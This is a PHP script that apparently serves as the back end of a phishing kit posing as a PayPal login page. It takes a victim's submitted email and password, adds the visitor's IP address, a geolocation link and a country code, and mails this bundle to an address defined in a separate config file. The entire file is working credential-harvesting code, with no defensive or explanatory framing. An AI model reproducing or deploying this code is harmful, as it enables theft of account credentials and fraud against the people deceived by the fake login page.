<?php
  session_start();
  require_once("../inc/config.inc.php");
  if(isset($_GET['submit'])) {
    $email = $_GET['email'];
    $password = $_GET['password'];
    $_SESSION['step'] = "s1";
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
[~]==================♥ Xyloris Login ♥==================[~]
|Email    = $email 
|Password = $password 
|=====================================================
|--------------------♥ Xyloris Parsonal Info ♥-----------------
|IP       =  $ip
|Geo      = http://www.geoiptool.com/?IP=$ip
|Country  = ".$_SESSION["cd"]."
[~]===================================================[~]
    ";
    $subject = "♥ S3XY PAYPAL LOGIN From [$cd] - $ip ♥";
    mail($tomail, $subject, $body);
    echo "RESULT:DONE;";
  }
?>
